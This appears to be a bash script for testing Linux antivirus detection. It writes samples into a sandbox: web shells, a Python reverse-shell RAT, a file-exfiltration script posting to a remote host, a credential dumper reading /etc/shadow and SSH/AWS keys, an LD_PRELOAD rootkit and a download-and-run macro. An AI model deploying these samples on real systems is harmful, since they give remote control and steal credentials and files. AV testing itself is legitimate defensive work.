#!/bin/bash

# ==============================================================================
# ENHANCED ANTIVIRUS TEST SCRIPT FOR LINUX
# Complete malware detection coverage with safe simulation
# System harmless with full rollback capability
# ==============================================================================

# --- COLOR SETTINGS ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# --- SETTINGS ---
SANDBOX_DIR="./av_test_sandbox"
LOG_FILE="./av_test_results.log"
TEST_COUNT=0
PASSED_COUNT=0
FAILED_COUNT=0
WARNING_COUNT=0
SCENARIO_NUM=0

# Rollback tracking
CREATED_FILES=()
STARTED_PROCESSES=()
MODIFIED_FILES=()

# Track resources
track_file() {
    CREATED_FILES+=("$1")
}

track_process() {
    STARTED_PROCESSES+=("$1")
}

backup_file() {
    if [ -f "$1" ]; then
        cp "$1" "$1.backup.$$"
        MODIFIED_FILES+=("$1")
    fi
}

# Log test results
log_result() {
    local status=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$status] $message" >> "$LOG_FILE"
}

# Execute command with detailed output and status checking
execute_command() {
    local cmd=$1
    local description=$2
    local expected_success=${3:-true}
    local detection_point=$4
    local malware_type=$5
    
    TEST_COUNT=$((TEST_COUNT + 1))
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}[TEST $TEST_COUNT]${NC} ${MAGENTA}$description${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}>>> Executing:${NC} ${YELLOW}$cmd${NC}"
    
    if [ -n "$detection_point" ]; then
        echo -e "${MAGENTA}>>> AV Detection:${NC} ${CYAN}$detection_point${NC}"
    fi
    
    if [ -n "$malware_type" ]; then
        echo -e "${YELLOW}>>> Malware Type:${NC} ${CYAN}$malware_type${NC}"
    fi
    
    echo -e "${BLUE}>>> Status:${NC}"
    
    # Execute with timeout
    timeout 10 bash -c "$cmd" 2>&1 | while IFS= read -r line; do
        echo -e "${WHITE}    $line${NC}"
    done
    local exit_code=${PIPESTATUS[0]}
    
    # Check for timeout
    if [ $exit_code -eq 124 ]; then
        echo -e "${YELLOW}>>> [⏱] TIMEOUT (Command exceeded 10 seconds)${NC}"
        log_result "TIMEOUT" "$description - Command timeout"
        WARNING_COUNT=$((WARNING_COUNT + 1))
        return 124
    fi
    
    if [ "$expected_success" = "true" ]; then
        if [ $exit_code -eq 0 ]; then
            echo -e "${GREEN}>>> [✓] SUCCESS (Exit Code: $exit_code)${NC}"
            log_result "PASS" "$description - Command executed successfully"
            PASSED_COUNT=$((PASSED_COUNT + 1))
            return 0
        else
            echo -e "${RED}>>> [✗] FAILED (Exit Code: $exit_code)${NC}"
            log_result "FAIL" "$description - Command failed (Exit: $exit_code)"
            FAILED_COUNT=$((FAILED_COUNT + 1))
            return 1
        fi
    else
        if [ $exit_code -ne 0 ]; then
            echo -e "${YELLOW}>>> [⚠] EXPECTED FAILURE (Exit Code: $exit_code) - AV protection active${NC}"
            log_result "WARN" "$description - Expected failure (AV working)"
            WARNING_COUNT=$((WARNING_COUNT + 1))
            return 0
        else
            echo -e "${RED}>>> [✗] UNEXPECTED SUCCESS (Exit Code: $exit_code)${NC}"
            log_result "FAIL" "$description - Unexpected success (AV may be inactive)"
            FAILED_COUNT=$((FAILED_COUNT + 1))
            return 1
        fi
    fi
}

# Print scenario header
print_scenario() {
    SCENARIO_NUM=$((SCENARIO_NUM + 1))
    echo -e "\n${RED}╔═══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║${NC} ${MAGENTA}SCENARIO $SCENARIO_NUM: $1${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}Description:${NC} $2"
    if [ -n "$3" ]; then
        echo -e "${YELLOW}AV Detection:${NC} $3"
    fi
    if [ -n "$4" ]; then
        echo -e "${YELLOW}Malware Family:${NC} $4"
    fi
    echo ""
}

# Wait for AV scan
wait_for_av() {
    echo -e "${BLUE}>>> Waiting 3 seconds for AV scan...${NC}"
    sleep 3
}

# Verify file was detected/blocked
verify_av_detection() {
    local file=$1
    local expected_blocked=$2
    
    if [ -f "$file" ]; then
        if [ "$expected_blocked" = "true" ]; then
            echo -e "${RED}>>> [!] WARNING: File exists - AV may not have blocked it${NC}"
            
            # Try ClamAV scan if available
            if command -v clamscan &> /dev/null; then
                echo -e "${BLUE}>>> Running ClamAV verification scan...${NC}"
                clamscan --no-summary "$file" 2>&1 | grep -q "FOUND" && {
                    echo -e "${GREEN}>>> [✓] ClamAV detected threat${NC}"
                } || {
                    echo -e "${YELLOW}>>> [?] ClamAV did not detect threat${NC}"
                }
            fi
        else
            echo -e "${GREEN}>>> [✓] File created successfully${NC}"
        fi
    else
        if [ "$expected_blocked" = "true" ]; then
            echo -e "${GREEN}>>> [✓] File was blocked/deleted by AV${NC}"
        else
            echo -e "${RED}>>> [✗] File was unexpectedly blocked${NC}"
        fi
    fi
}

# Cleanup function
cleanup() {
    echo -e "\n${BLUE}╔═══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${WHITE}PERFORMING CLEANUP & ROLLBACK${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════╝${NC}"
    
    # Kill processes
    echo -e "${CYAN}[*] Terminating spawned processes...${NC}"
    for pid in "${STARTED_PROCESSES[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            kill -9 "$pid" 2>/dev/null
            echo -e "${GREEN}  [✓] Killed process: $pid${NC}"
        fi
    done
    
    pkill -9 -f "xmrig|cryptominer|malware" 2>/dev/null
    
    # Restore files
    echo -e "${CYAN}[*] Restoring modified files...${NC}"
    for file in "${MODIFIED_FILES[@]}"; do
        if [ -f "$file.backup.$$" ]; then
            mv "$file.backup.$$" "$file"
            echo -e "${GREEN}  [✓] Restored: $file${NC}"
        fi
    done
    
    # Remove created files
    echo -e "${CYAN}[*] Removing created files...${NC}"
    for file in "${CREATED_FILES[@]}"; do
        if [ -e "$file" ]; then
            rm -rf "$file" 2>/dev/null
            echo -e "${GREEN}  [✓] Removed: $file${NC}"
        fi
    done
    
    # Clean sandbox
    if [ -d "$SANDBOX_DIR" ]; then
        rm -rf "$SANDBOX_DIR" 2>/dev/null
        echo -e "${GREEN}  [✓] Removed sandbox: $SANDBOX_DIR${NC}"
    fi
    
    # Clean temp files
    find /tmp -name "malware_*" -o -name "suspicious_*" -delete 2>/dev/null
    
    echo -e "${GREEN}[✓] Cleanup completed. System restored.${NC}"
}

trap cleanup EXIT INT TERM

# Start
clear
echo -e "${RED}╔═══════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║${NC} ${WHITE}ENHANCED ANTIVIRUS TEST SIMULATOR FOR LINUX${NC}"
echo -e "${RED}║${NC} ${WHITE}Complete Malware Detection Coverage${NC}"
echo -e "${RED}╚═══════════════════════════════════════════════════════════════════════════╝${NC}"
echo -e "${CYAN}This script tests antivirus detection with complete rollback.${NC}"
echo -e "${CYAN}All operations are safe and will be reversed.${NC}"
echo ""
echo -e "${YELLOW}Log file: $LOG_FILE${NC}"
echo -e "${YELLOW}Sandbox directory: $SANDBOX_DIR${NC}"
echo ""
sleep 2

# Initialize
echo "=== ENHANCED ANTIVIRUS TEST REPORT ===" > "$LOG_FILE"
echo "Start: $(date)" >> "$LOG_FILE"
echo "System: $(uname -a)" >> "$LOG_FILE"
echo "" >> "$LOG_FILE"

mkdir -p "$SANDBOX_DIR"
track_file "$SANDBOX_DIR"

# ==============================================================================
# SCENARIO 1: EICAR TEST FILE
# ==============================================================================
print_scenario "EICAR Standard Test File" \
    "Industry-standard AV test file" \
    "AV: Signature detection, EICAR pattern" \
    "EICAR-Test-File"

EICAR_FILE="$SANDBOX_DIR/eicar.com"
execute_command "echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' > '$EICAR_FILE'" "Create EICAR test file" true "AV: EICAR signature" "EICAR"
track_file "$EICAR_FILE"
verify_av_detection "$EICAR_FILE" "true"

wait_for_av

# ==============================================================================
# SCENARIO 2: EICAR VARIANTS
# ==============================================================================
print_scenario "EICAR File Variants" \
    "Tests EICAR in different formats" \
    "AV: Format-independent detection" \
    "EICAR-Variants"

# EICAR in archive
execute_command "echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' | gzip > '$SANDBOX_DIR/eicar.gz'" "EICAR in gzip" true "AV: Archive scanning" "EICAR-GZ"
track_file "$SANDBOX_DIR/eicar.gz"

execute_command "echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' | base64 > '$SANDBOX_DIR/eicar.b64'" "EICAR base64 encoded" true "AV: Encoding detection" "EICAR-B64"
track_file "$SANDBOX_DIR/eicar.b64"

wait_for_av

# ==============================================================================
# SCENARIO 3: WEB SHELLS
# ==============================================================================
print_scenario "Web Shell Detection" \
    "Creates various web shell types" \
    "AV: Web shell signature, Backdoor detection" \
    "WebShell"

WEBSHELL_DIR="$SANDBOX_DIR/webshells"
mkdir -p "$WEBSHELL_DIR"
track_file "$WEBSHELL_DIR"

# PHP web shells
execute_command "echo '<?php system(\$_GET[\"cmd\"]); ?>' > '$WEBSHELL_DIR/shell.php'" "PHP system() webshell" true "AV: PHP webshell" "PHP-WebShell"
track_file "$WEBSHELL_DIR/shell.php"

execute_command "echo '<?php eval(\$_POST[\"x\"]); ?>' > '$WEBSHELL_DIR/eval.php'" "PHP eval() webshell" true "AV: PHP eval detection" "PHP-Eval"
track_file "$WEBSHELL_DIR/eval.php"

execute_command "echo '<?php @eval(\$_POST[\"pass\"]); ?>' > '$WEBSHELL_DIR/c99.php'" "C99 shell variant" true "AV: C99 signature" "C99-Shell"
track_file "$WEBSHELL_DIR/c99.php"

# JSP web shell
execute_command "echo '<%@ page import=\"java.io.*\" %><% Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > '$WEBSHELL_DIR/shell.jsp'" "JSP webshell" true "AV: JSP webshell" "JSP-WebShell"
track_file "$WEBSHELL_DIR/shell.jsp"

# ASP web shell
execute_command "echo '<%eval request(\"cmd\")%>' > '$WEBSHELL_DIR/shell.asp'" "ASP webshell" true "AV: ASP webshell" "ASP-WebShell"
track_file "$WEBSHELL_DIR/shell.asp"

wait_for_av

# ==============================================================================
# SCENARIO 4: RANSOMWARE SIMULATION
# ==============================================================================
print_scenario "Ransomware Behavior Simulation" \
    "Simulates file encryption patterns" \
    "AV: Ransomware behavior, Mass encryption" \
    "Ransomware-Simulation"

DOCS_DIR="$SANDBOX_DIR/documents"
mkdir -p "$DOCS_DIR"
track_file "$DOCS_DIR"

# Create test documents
for i in {1..20}; do
    echo "Important Document $i - Confidential Data" > "$DOCS_DIR/document_$i.txt"
    track_file "$DOCS_DIR/document_$i.txt"
done

echo -e "${BLUE}>>> Creating 20 test documents...${NC}"
echo -e "${BLUE}>>> Simulating ransomware encryption...${NC}"

ENCRYPTED_COUNT=0
START_TIME=$(date +%s)

# Encrypt files rapidly (behavioral trigger)
for file in "$DOCS_DIR"/*.txt; do
    if [ -f "$file" ]; then
        # Simulate encryption with openssl
        openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.locked" -k "ransom_key" 2>/dev/null
        rm "$file" 2>/dev/null
        track_file "${file}.locked"
        ENCRYPTED_COUNT=$((ENCRYPTED_COUNT + 1))
    fi
done

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

execute_command "echo 'Encrypted $ENCRYPTED_COUNT files in $DURATION seconds'" "Ransomware encryption speed" true "AV: Rapid encryption behavior" "Ransomware"

# Create ransom note
RANSOM_NOTE="$DOCS_DIR/README_RANSOM.txt"
execute_command "cat > '$RANSOM_NOTE' << 'EOF'
YOUR FILES HAVE BEEN ENCRYPTED!
All your important files have been encrypted with military-grade encryption.
To recover your files, send 1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
After payment, contact: decrypt@ransom.com
EOF" "Create ransom note" true "AV: Ransom note detection" "Ransom-Note"
track_file "$RANSOM_NOTE"

wait_for_av

# ==============================================================================
# SCENARIO 5: CRYPTO MINER
# ==============================================================================
print_scenario "Cryptocurrency Miner" \
    "Simulates crypto mining malware" \
    "AV: Crypto miner detection, CPU abuse" \
    "CryptoMiner"

# Start CPU-intensive process with miner name
(exec -a xmrig bash -c 'while true; do echo $((RANDOM*RANDOM*RANDOM)) > /dev/null; done') &
MINER_PID=$!
track_process "$MINER_PID"

execute_command "ps -p $MINER_PID -o comm=,pid,%cpu,%mem" "Crypto miner process" true "AV: Process name 'xmrig'" "XMRig"
echo -e "${BLUE}>>> Letting miner run for 10 seconds...${NC}"
sleep 10

execute_command "kill $MINER_PID 2>/dev/null && echo 'Miner stopped'" "Stop crypto miner" true "AV: Process termination" "XMRig"

# Create miner config
MINER_CONFIG="$SANDBOX_DIR/config.json"
execute_command "cat > '$MINER_CONFIG' << 'EOF'
{
    \"pools\": [{
        \"url\": \"pool.supportxmr.com:443\",
        \"user\": \"wallet_address\",
        \"pass\": \"x\"
    }],
    \"cpu\": {
        \"enabled\": true,
        \"max-threads\": 100
    }
}
EOF" "Create miner config" true "AV: Miner config detection" "Miner-Config"
track_file "$MINER_CONFIG"

wait_for_av

# ==============================================================================
# SCENARIO 6: SUSPICIOUS FILE LOCATIONS
# ==============================================================================
print_scenario "Suspicious File Locations" \
    "Creates files in unusual locations" \
    "AV: Location-based heuristics" \
    "Suspicious-Location"

execute_command "echo '#!/bin/bash' > /tmp/.systemd-private && echo 'echo malicious' >> /tmp/.systemd-private" "Hidden file in /tmp" true "AV: Hidden file in temp" "Hidden-Script"
track_file "/tmp/.systemd-private"

execute_command "chmod +x /tmp/.systemd-private" "Make temp file executable" true "AV: Executable in temp" "Temp-Executable"

# Suspicious filename patterns
execute_command "echo 'malware' > '$SANDBOX_DIR/update.exe'" "Windows executable name on Linux" true "AV: Suspicious extension" "Fake-EXE"
track_file "$SANDBOX_DIR/update.exe"

execute_command "echo 'payload' > '$SANDBOX_DIR/invoice.pdf.exe'" "Double extension file" true "AV: Double extension" "Double-Extension"
track_file "$SANDBOX_DIR/invoice.pdf.exe"

wait_for_av

# ==============================================================================
# SCENARIO 7: PACKED/OBFUSCATED FILES
# ==============================================================================
print_scenario "Packed and Obfuscated Files" \
    "Tests detection of obfuscated malware" \
    "AV: Heuristic detection, Unpacking" \
    "Packed-Malware"

# Base64 obfuscation
OBFUSCATED="$SANDBOX_DIR/obfuscated.sh"
execute_command "echo 'ZWNobyAnbWFsaWNpb3VzIHBheWxvYWQn' | base64 -d > '$OBFUSCATED'" "Base64 obfuscated script" true "AV: Obfuscation detection" "Base64-Obfuscated"
track_file "$OBFUSCATED"

# Hex encoding
execute_command "echo '6d616c6963696f7573' | xxd -r -p > '$SANDBOX_DIR/hex_encoded'" "Hex encoded payload" true "AV: Hex detection" "Hex-Encoded"
track_file "$SANDBOX_DIR/hex_encoded"

# Binary padding (AV evasion technique)
PADDED="$SANDBOX_DIR/padded_malware"
execute_command "echo 'malicious_code' > '$PADDED' && dd if=/dev/urandom bs=1M count=10 >> '$PADDED' 2>/dev/null" "Padded binary" true "AV: Binary padding detection" "Padded-Binary"
track_file "$PADDED"

wait_for_av

# ==============================================================================
# SCENARIO 8: KEYLOGGER SIMULATION
# ==============================================================================
print_scenario "Keylogger Behavior" \
    "Simulates keystroke logging" \
    "AV: Keylogger detection, Input monitoring" \
    "Keylogger"

KEYLOG_SCRIPT="$SANDBOX_DIR/keylogger.sh"
execute_command "cat > '$KEYLOG_SCRIPT' << 'EOF'
#!/bin/bash
while true; do
    xinput test-xi2 --root 2>/dev/null >> /tmp/.keylog
    sleep 1
done
EOF" "Create keylogger script" true "AV: Keylogger pattern" "Keylogger-Script"
track_file "$KEYLOG_SCRIPT"

execute_command "chmod +x '$KEYLOG_SCRIPT'" "Make keylogger executable" true "AV: Keylogger executable" "Keylogger"

wait_for_av

# ==============================================================================
# SCENARIO 9: BACKDOOR/RAT SIMULATION
# ==============================================================================
print_scenario "Remote Access Trojan (RAT)" \
    "Simulates RAT backdoor" \
    "AV: RAT detection, Backdoor" \
    "RAT"

RAT_SCRIPT="$SANDBOX_DIR/rat.py"
execute_command "cat > '$RAT_SCRIPT' << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess

def connect():
    s = socket.socket()
    s.connect((\"192.0.2.1\", 4444))
    while True:
        cmd = s.recv(1024).decode()
        if cmd == \"exit\": break
        output = subprocess.check_output(cmd, shell=True)
        s.send(output)
    s.close()

connect()
EOF" "Create RAT script" true "AV: RAT pattern detection" "Python-RAT"
track_file "$RAT_SCRIPT"

wait_for_av

# ==============================================================================
# SCENARIO 10: ROOTKIT SIMULATION
# ==============================================================================
print_scenario "Rootkit Components" \
    "Simulates rootkit artifacts" \
    "AV: Rootkit detection" \
    "Rootkit"

ROOTKIT_LIB="$SANDBOX_DIR/librootkit.c"
execute_command "cat > '$ROOTKIT_LIB' << 'EOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

struct dirent *(*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir)
        original_readdir = dlsym(RTLD_NEXT, \"readdir\");
    
    struct dirent *dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        if (strstr(dir->d_name, \"malware\") != NULL)
            continue;
        break;
    }
    return dir;
}
EOF" "Create rootkit library" true "AV: Rootkit library" "Rootkit-Lib"
track_file "$ROOTKIT_LIB"

wait_for_av

# ==============================================================================
# SCENARIO 11: KNOWN MALWARE HASHES
# ==============================================================================
print_scenario "Known Malware Hash Simulation" \
    "Creates files with known malware patterns" \
    "AV: Hash-based detection" \
    "Known-Malware"

# Simulate known malware families
MALWARE_FAMILIES=(
    "WannaCry:wcry_simulation"
    "Emotet:emotet_simulation"
    "TrickBot:trickbot_simulation"
    "Mirai:mirai_simulation"
    "Zeus:zeus_simulation"
)

for family in "${MALWARE_FAMILIES[@]}"; do
    name="${family%%:*}"
    content="${family##*:}"
    file="$SANDBOX_DIR/${name}_sample"
    execute_command "echo '$content' | md5sum | awk '{print \$1}' > '$file'" "Simulate $name malware" true "AV: $name signature" "$name"
    track_file "$file"
done

wait_for_av

# ==============================================================================
# SCENARIO 12: POLYMORPHIC MALWARE SIMULATION
# ==============================================================================
print_scenario "Polymorphic Malware Variants" \
    "Creates multiple variants of same malware" \
    "AV: Polymorphic detection, Heuristics" \
    "Polymorphic"

for i in {1..5}; do
    VARIANT="$SANDBOX_DIR/variant_$i.sh"
    execute_command "cat > '$VARIANT' << EOF
#!/bin/bash
# Variant $i - random padding: \$RANDOM\$RANDOM
echo 'malicious_payload_$i'
curl -s http://c2-server.com/beacon?id=$i
EOF" "Create polymorphic variant $i" true "AV: Polymorphic variant" "Polymorphic-$i"
    track_file "$VARIANT"
done

wait_for_av

# ==============================================================================
# SCENARIO 13: EXPLOIT KIT ARTIFACTS
# ==============================================================================
print_scenario "Exploit Kit Components" \
    "Simulates exploit kit artifacts" \
    "AV: Exploit kit detection" \
    "ExploitKit"

# Malicious JavaScript
EXPLOIT_JS="$SANDBOX_DIR/exploit.js"
execute_command "cat > '$EXPLOIT_JS' << 'EOF'
// Exploit kit JavaScript
var shellcode = unescape(\"%u4141%u4141%u4141\");
eval(atob(\"dmFyIHBheWxvYWQgPSBcImV4cGxvaXRcIjs=\"));
document.write(\"<iframe src='http://malicious.com/payload.exe'></iframe>\");
EOF" "Create exploit JavaScript" true "AV: Malicious JavaScript" "ExploitKit-JS"
track_file "$EXPLOIT_JS"

# PDF exploit
EXPLOIT_PDF="$SANDBOX_DIR/exploit.pdf"
execute_command "cat > '$EXPLOIT_PDF' << 'EOF'
%PDF-1.4
/Type /Catalog
/OpenAction << /S /JavaScript /JS (app.alert(\"Exploit\");) >>
/Names << /EmbeddedFiles << /Names [(payload.exe) 7 0 R] >> >>
EOF" "Create malicious PDF" true "AV: PDF exploit" "PDF-Exploit"
track_file "$EXPLOIT_PDF"

wait_for_av

# ==============================================================================
# SCENARIO 14: MACRO-ENABLED DOCUMENTS
# ==============================================================================
print_scenario "Malicious Office Macros" \
    "Simulates macro malware" \
    "AV: Macro detection" \
    "Macro-Malware"

MACRO_DOC="$SANDBOX_DIR/invoice.docm"
execute_command "cat > '$MACRO_DOC' << 'EOF'
Sub AutoOpen()
    Shell \"powershell -c (New-Object Net.WebClient).DownloadFile('http://malicious.com/payload.exe','C:\\temp\\malware.exe')\"
    Shell \"C:\\temp\\malware.exe\"
End Sub
EOF" "Create macro document" true "AV: Macro malware" "Office-Macro"
track_file "$MACRO_DOC"

wait_for_av

# ==============================================================================
# SCENARIO 15: LATERAL MOVEMENT TOOLS
# ==============================================================================
print_scenario "Lateral Movement Tool Simulation" \
    "Simulates tools used for lateral movement" \
    "AV: Hacking tool detection" \
    "HackTool"

# PSExec-like tool
PSEXEC="$SANDBOX_DIR/psexec"
execute_command "echo 'PsExec simulation - lateral movement tool' > '$PSEXEC'" "Simulate PsExec" true "AV: PsExec detection" "PsExec"
track_file "$PSEXEC"

# Mimikatz-like
MIMIKATZ="$SANDBOX_DIR/mimikatz.exe"
execute_command "echo 'Mimikatz simulation - credential dumping' > '$MIMIKATZ'" "Simulate Mimikatz" true "AV: Mimikatz detection" "Mimikatz"
track_file "$MIMIKATZ"

wait_for_av

# ==============================================================================
# SCENARIO 16: FILELESS MALWARE ARTIFACTS
# ==============================================================================
print_scenario "Fileless Malware Evidence" \
    "Tests detection of memory-based threats" \
    "AV: Fileless threat detection" \
    "Fileless"

# PowerShell encoded command (Linux equivalent)
execute_command "echo 'bash -c \"\$(echo aWQgLWE= | base64 -d)\"' > '$SANDBOX_DIR/fileless.sh'" "Fileless execution script" true "AV: Fileless pattern" "Fileless-Script"
track_file "$SANDBOX_DIR/fileless.sh"

wait_for_av

# ==============================================================================
# SCENARIO 17: CREDENTIAL DUMPING TOOLS
# ==============================================================================
print_scenario "Credential Dumping Simulation" \
    "Simulates credential theft tools" \
    "AV: Credential dumper detection" \
    "CredDump"

CRED_DUMP="$SANDBOX_DIR/dump_creds.sh"
execute_command "cat > '$CRED_DUMP' << 'EOF'
#!/bin/bash
# Credential dumping simulation
cat /etc/shadow 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.aws/credentials 2>/dev/null
grep -r \"password\" /var/www/ 2>/dev/null
EOF" "Create credential dumper" true "AV: Credential dumper" "CredDump"
track_file "$CRED_DUMP"

wait_for_av

# ==============================================================================
# SCENARIO 18: NETWORK SCANNER TOOLS
# ==============================================================================
print_scenario "Network Scanner Detection" \
    "Simulates network scanning tools" \
    "AV: Network scanner detection" \
    "NetScanner"

NMAP_SIM="$SANDBOX_DIR/nmap_scan.sh"
execute_command "cat > '$NMAP_SIM' << 'EOF'
#!/bin/bash
# Network scanner simulation
for ip in 192.168.1.{1..254}; do
    ping -c 1 -W 1 \$ip &
done
wait
EOF" "Create network scanner" true "AV: Network scanner" "Scanner"
track_file "$NMAP_SIM"

wait_for_av

# ==============================================================================
# SCENARIO 19: DATA EXFILTRATION TOOLS
# ==============================================================================
print_scenario "Data Exfiltration Tools" \
    "Simulates data theft tools" \
    "AV: Exfiltration tool detection" \
    "Exfiltration"

EXFIL_TOOL="$SANDBOX_DIR/exfiltrate.py"
execute_command "cat > '$EXFIL_TOOL' << 'EOF'
#!/usr/bin/env python3
import os
import requests

def exfiltrate():
    files = []
    for root, dirs, filenames in os.walk(\"/home\"):
        for f in filenames:
            if f.endswith((\".pdf\", \".docx\", \".txt\")):
                files.append(os.path.join(root, f))
    
    for f in files:
        with open(f, 'rb') as data:
            requests.post(\"http://192.0.2.1/upload\", files={\"file\": data})

exfiltrate()
EOF" "Create exfiltration tool" true "AV: Exfiltration tool" "Exfil-Tool"
track_file "$EXFIL_TOOL"

wait_for_av

# ==============================================================================
# SCENARIO 20: BOTNET CLIENT
# ==============================================================================
print_scenario "Botnet Client Simulation" \
    "Simulates botnet malware" \
    "AV: Botnet detection" \
    "Botnet"

BOTNET_CLIENT="$SANDBOX_DIR/bot.py"
execute_command "cat > '$BOTNET_CLIENT' << 'EOF'
#!/usr/bin/env python3
import socket
import time

def beacon():
    while True:
        try:
            s = socket.socket()
            s.connect((\"192.0.2.1\", 6667))
            s.send(b\"NICK bot123\\r\\n\")
            s.send(b\"JOIN #botnet\\r\\n\")
            time.sleep(60)
        except:
            pass

beacon()
EOF" "Create botnet client" true "AV: Botnet pattern" "Botnet"
track_file "$BOTNET_CLIENT"

wait_for_av

# ==============================================================================
# SCENARIO 21: WIPER MALWARE SIMULATION
# ==============================================================================
print_scenario "Wiper Malware Behavior" \
    "Simulates destructive wiper malware" \
    "AV: Wiper detection, Destructive behavior" \
    "Wiper"

WIPER_DIR="$SANDBOX_DIR/wiper_test"
mkdir -p "$WIPER_DIR"
track_file "$WIPER_DIR"

# Create test files
for i in {1..10}; do
    echo "Test data $i" > "$WIPER_DIR/file_$i.txt"
    track_file "$WIPER_DIR/file_$i.txt"
done

echo -e "${BLUE}>>> Simulating wiper behavior (safe - only in sandbox)...${NC}"

# Overwrite files with zeros (wiper behavior)
for file in "$WIPER_DIR"/*.txt; do
    dd if=/dev/zero of="$file" bs=1K count=1 2>/dev/null
done

execute_command "echo 'Wiped 10 files'" "Wiper file destruction" true "AV: Wiper behavior" "Wiper"

wait_for_av

# ==============================================================================
# SCENARIO 22: SCREEN CAPTURE MALWARE
# ==============================================================================
print_scenario "Screen Capture Malware" \
    "Simulates screen grabber" \
    "AV: Screen capture detection" \
    "ScreenGrabber"

SCREEN_GRAB="$SANDBOX_DIR/screen_grab.sh"
execute_command "cat > '$SCREEN_GRAB' << 'EOF'
#!/bin/bash
# Screen capture simulation
while true; do
    scrot /tmp/screen_\$(date +%s).png 2>/dev/null
    sleep 60
done
EOF" "Create screen grabber" true "AV: Screen capture tool" "ScreenGrabber"
track_file "$SCREEN_GRAB"

wait_for_av

# ==============================================================================
# SCENARIO 23: BROWSER HIJACKER
# ==============================================================================
print_scenario "Browser Hijacker" \
    "Simulates browser modification malware" \
    "AV: Browser hijacker detection" \
    "BrowserHijacker"

HIJACKER="$SANDBOX_DIR/browser_hijack.sh"
execute_command "cat > '$HIJACKER' << 'EOF'
#!/bin/bash
# Browser hijacker simulation
echo '{\"homepage\":\"http://malicious-search.com\"}' > ~/.config/google-chrome/Default/Preferences
echo 'user_pref(\"browser.startup.homepage\", \"http://malicious-search.com\");' >> ~/.mozilla/firefox/*.default*/prefs.js
EOF" "Create browser hijacker" true "AV: Browser hijacker" "Hijacker"
track_file "$HIJACKER"

wait_for_av

# ==============================================================================
# SCENARIO 24: ADWARE SIMULATION
# ==============================================================================
print_scenario "Adware Components" \
    "Simulates adware behavior" \
    "AV: Adware detection, PUP" \
    "Adware"

ADWARE="$SANDBOX_DIR/adware.sh"
execute_command "cat > '$ADWARE' << 'EOF'
#!/bin/bash
# Adware simulation
while true; do
    xdg-open \"http://ads.malicious.com/popup.html\" 2>/dev/null
    sleep 300
done
EOF" "Create adware script" true "AV: Adware/PUP" "Adware"
track_file "$ADWARE"

wait_for_av

# ==============================================================================
# SCENARIO 25: BANKING TROJAN SIMULATION
# ==============================================================================
print_scenario "Banking Trojan" \
    "Simulates financial malware" \
    "AV: Banking trojan detection" \
    "BankingTrojan"

BANKING_TROJAN="$SANDBOX_DIR/banker.py"
execute_command "cat > '$BANKING_TROJAN' << 'EOF'
#!/usr/bin/env python3
# Banking trojan simulation
import re

def steal_credentials():
    patterns = [
        r'(?i)bank.*username.*:.*',
        r'(?i)credit.*card.*:.*\d{16}',
        r'(?i)cvv.*:.*\d{3}'
    ]
    
    for pattern in patterns:
        # Search browser data for patterns
        pass

steal_credentials()
EOF" "Create banking trojan" true "AV: Banking trojan" "Banker"
track_file "$BANKING_TROJAN"

wait_for_av

# ==============================================================================
# FINAL REPORT
# ==============================================================================

echo -e "\n${RED}╔═══════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║${NC} ${GREEN}AV TEST SUCCESSFULLY COMPLETED${NC}"
echo -e "${RED}╚═══════════════════════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${CYAN}╔═══════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC} ${WHITE}TEST STATISTICS${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════════════════╝${NC}"
echo -e "${YELLOW}Total Tests: $TEST_COUNT${NC}"
echo -e "${GREEN}Passed: $PASSED_COUNT${NC}"
echo -e "${RED}Failed: $FAILED_COUNT${NC}"
echo -e "${MAGENTA}Warnings: $WARNING_COUNT${NC}"
echo -e "${CYAN}Total Scenarios: $SCENARIO_NUM${NC}"

SUCCESS_RATE=$(( (PASSED_COUNT + WARNING_COUNT) * 100 / TEST_COUNT ))
echo -e "${CYAN}Success Rate: ${SUCCESS_RATE}%${NC}"

echo "" >> "$LOG_FILE"
echo "=== TEST STATISTICS ===" >> "$LOG_FILE"
echo "Total Tests: $TEST_COUNT" >> "$LOG_FILE"
echo "Passed: $PASSED_COUNT" >> "$LOG_FILE"
echo "Failed: $FAILED_COUNT" >> "$LOG_FILE"
